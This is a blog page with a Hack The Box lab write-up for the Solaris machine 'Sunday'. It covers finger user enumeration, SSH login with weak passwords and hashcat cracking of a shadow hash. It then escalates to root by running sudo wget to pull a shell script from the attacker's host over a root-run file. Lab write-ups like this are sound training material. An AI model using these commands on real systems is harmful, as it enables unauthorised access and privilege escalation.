@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Sunday - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Sunday"><a href="#Hack-The-Box-Sunday" class="headerlink" title="Hack The Box - Sunday"></a>Hack The Box - Sunday</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials. Its IP address is <code>10.10.10.76</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/sunday/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sunday)
+ |                                                                                                                                                                          
+ |-->{SFire129}#nmap -p- -sC -sV -T 4 10.10.10.76
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 06:05 EDT
+ Warning: 10.10.10.76 giving up on port because retransmission cap hit (6).
+ Stats: 0:13:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 56.86% done; ETC: 06:30 (0:10:24 remaining)
+ Nmap scan report for 10.10.10.76
+ Host is up (0.095s latency).
+ Not shown: 63436 closed ports, 2094 filtered ports
+ PORT      STATE SERVICE VERSION
+ 79/tcp    open  finger  Sun Solaris fingerd
+ | finger: Login       Name               TTY         Idle    When    Where\x0D
+ |_sunny    sunny                 pts/2            Mon 01:46  10.10.14.45         \x0D
+ 111/tcp   open  rpcbind 2-4 (RPC #100000)
+ 22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
+ | ssh-hostkey: 
+ |   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+ |_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+ 38680/tcp open  unknown
+ 54613/tcp open  unknown
+ Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 1661.74 seconds </figure></pre>
+ <p>The result show a service <code>fingered</code> on port 79, run the <code>finger-user-enum.pl</code> for service enumerate and possibles users.
+ <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Download the perl script  <code>finger-user-enum.pl</code> and run against the target.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/linux)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76                                                                    
+ Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+ 
+  ----------------------------------------------------------
+ |                   Scan Information                       |
+  ----------------------------------------------------------
+ 
+ Worker Processes ......... 5
+ Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
+ Target count ............. 1
+ Username count ........... 10164
+ Target TCP port .......... 79
+ Query timeout ............ 5 secs
+ Relay Server ............. Not used
+ 
+ ######## Scan started at Mon Jun 29 05:30:03 2020 #########
+ access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
+ admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
+ anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
+ bin@10.10.10.76: bin             ???                         < .  .  .  . >..
+ dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
+ 
+ jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
+ la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
+ line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
+ message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
+ miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
+ root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
+ sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..
+ sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
+ sys@10.10.10.76: sys             ???                         < .  .  .  . >..
+ zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
+ ######## Scan completed at Mon Jun 29 06:02:50 2020 #########
+ 15 results.
+ 
+ 10164 queries in 1967 seconds (5.2 queries / sec)  </figure></pre>
+ <p>The output show the users sammy and sunny.<br>
+ <p>Run script again but with user root for enumerate and the output show the word <code>sunday</code>which is a possible password for user.
+  <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/linux)
+ |                                                                                                                                                                          
+ |-->{SFire129}#perl finger-user-enum.pl -u root -t 10.10.10.76
+ Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+ 
+  ----------------------------------------------------------
+ |                   Scan Information                       |
+  ----------------------------------------------------------
+ 
+ Worker Processes ......... 5
+ Target count ............. 1
+ Username count ........... 1
+ Target TCP port .......... 79
+ Query timeout ............ 5 secs
+ Relay Server ............. Not used
+ 
+ ######## Scan started at Mon Jun 29 06:24:48 2020 #########
+ root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
+ ######## Scan completed at Mon Jun 29 06:24:48 2020 #########
+ 1 results.
+ 
+ 1 queries in 1 seconds (1.0 queries / sec) </figure></pre>
+ <p>Connect with ssh service, the user sunny and password sunday.
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/linux)
+ |                                                                                                                                                                          
+ |-->{SFire129}#ssh -p 22022 sunny@10.10.10.76
+ Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+ |-------(root@kali)-------|(~/HackTheBox/linux)
+ |                                                                                                                                                                          
+ |-->{SFire129}#ssh -p 22022 -okexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76                                                                                  
+ The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
+ RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
+ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+ Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
+ Password: 
+ Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
+ Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+ sunny@sunday:~$ id
+ uid=65535(sunny) gid=1(other) groups=1(other)
+ sunny@sunday:~$ </figure></pre>
+ <p>With run the command <code>sudo -l</code> reveal a file that roon without privileges.
+  <pre><figure class="highlight plain">  sunny@sunday:/tmp$ sudo -l
+ User sunny may run the following commands on this host:
+     (root) NOPASSWD: /root/troll
+ sunny@sunday:/tmp$ sudo /root/troll
+ testing
+ uid=0(root) gid=0(root)
+ sunny@sunday:/tmp$ id
+ uid=65535(sunny) gid=1(other) groups=1(other)
+ sunny@sunday:/tmp$  </figure></pre>
+ <p>In the <code>/</code> location, show the folder backup with two files inside. one file has the hashes from users system,
+ <img src="/images/hackthebox/exploit/sunday/3.png" alt=""></p>
+ <p>Copy the hash sammy to local file and try to crack with hashcat. In the internet search hashcat examples and search the way for crack <code>$5$</code> hashes.
+  <img src="/images/hackthebox/exploit/sunday/1.png" alt=""></p>
+  <p>Crack with hashcat.
+  <pre><figure class="highlight plain">  D:\hashcat-6.0.0>type sunday.txt
+ $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
+ D:\hashcat-6.0.0>hashcat.exe -m 7400 sunday.txt rockyou.txt -O
+ hashcat (v6.0.0) starting...
+ 
+ OpenCL API (OpenCL 2.0 ) - Platform #1 [Intel(R) Corporation]
+ =============================================================
+ * Device #1: Intel(R) HD Graphics 5500, 4807/4871 MB (1217 MB allocatable), 24MCU
+ * Device #2: Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, skipped
+ 
+ Minimum password length supported by kernel: 0
+ Maximum password length supported by kernel: 55
+ 
+ Hashes: 1 digests; 1 unique digests, 1 unique salts
+ Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+ Rules: 1
+ 
+ Applicable optimizers:
+ * Optimized-Kernel
+ * Zero-Byte
+ * Single-Hash
+ * Single-Salt
+ 
+ Watchdog: Hardware monitoring interface not found on your system.
+ Watchdog: Temperature abort trigger disabled.
+ 
+ Host memory required for this attack: 116 MB
+ 
+ Dictionary cache hit:
+ * Filename..: rockyou.txt
+ * Passwords.: 14344385
+ * Bytes.....: 139921507
+ * Keyspace..: 14344385
+ 
+ $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
+ 
+ Session..........: hashcat
+ Status...........: Cracked
+ Hash.Name........: sha256crypt $5$, SHA256 (Unix)
+ Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
+ Time.Started.....: Mon Jun 29 12:03:58 2020 (45 secs)
+ Time.Estimated...: Mon Jun 29 12:04:43 2020 (0 secs)
+ Guess.Base.......: File (rockyou.txt)
+ Guess.Queue......: 1/1 (100.00%)
+ Speed.#1.........:     4722 H/s (17.19ms) @ Accel:64 Loops:32 Thr:8 Vec:1
+ Recovered........: 1/1 (100.00%) Digests
+ Progress.........: 208896/14344385 (1.46%)
+ Rejected.........: 0/208896 (0.00%)
+ Restore.Point....: 196608/14344385 (1.37%)
+ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+ Candidates.#1....: piggy! -> 15561556
+ 
+ Started: Mon Jun 29 12:03:40 2020
+ Stopped: Mon Jun 29 12:04:43 2020
+ D:\hashcat-6.0.0>hashcat.exe -m 7400 sunday.txt --show
+ $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!</figure></pre>
+<p>The password is <code>cooldude!</code> for user sammy.<br>
+<p>Log in with user sammy, but no has privileges root but allow to run wget command as a root user.
+ <pre><figure class="highlight plain">  sunny@sunday:/backup$ su - sammy 
+ Password: 
+ Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+ sammy@sunday:~$ id
+ uid=101(sammy) gid=10(staff) groups=10(staff)
+ sammy@sunday:~$ sudo -l
+User sammy may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/wget </figure></pre>
+<h2 id="Get_privileges"><a href="#Get_privileges" class="Get_privileges" title="Get_privileges"></a>Get_privileges</h2>
+ <p>Create a file with name troll in kali linux with the next content:
+  <pre><figure class="highlight plain"> #!/usr/bin/bash
+ bash </figure></pre>
+ <p>Run the http server for download the file from the ssh conection with the user sammy.
+  <pre><figure class="highlight plain">  sammy@sunday:~$ sudo wget  http://10.10.14.45/troll -O /root/troll
+ --19:22:05--  http://10.10.14.45/troll
+            => `/root/troll'
+ Connecting to 10.10.14.45:80... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 22 [application/octet-stream]
+                                                                                                                                                                                                                  
+ 100%[=====================================================================================================================================================================>] 22            --.--K/s              
+                                                                                                                                                                                                                  
+ 19:22:06 (2.61 MB/s) - `/root/troll' saved [22/22]                                                                                                                                                               
+                                                                                                                                                                                                                  
+ sammy@sunday:~$ </figure></pre>
+ <p>From user sunny run the <code>sudo /root/troll</code> for escalete privileges.
+ <img src="/images/hackthebox/exploit/sunday/2.png" alt=""></p>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+  <pre><figure class="highlight plain"> sammy@sunday:~/Desktop$ cat user.txt 
+***Here you could find the user flag***
+root@sunday:~# cat /root/root.txt
+***Here you could find the root flag***
+</figure></pre>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-29</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Solarwinds</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Fingerd</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
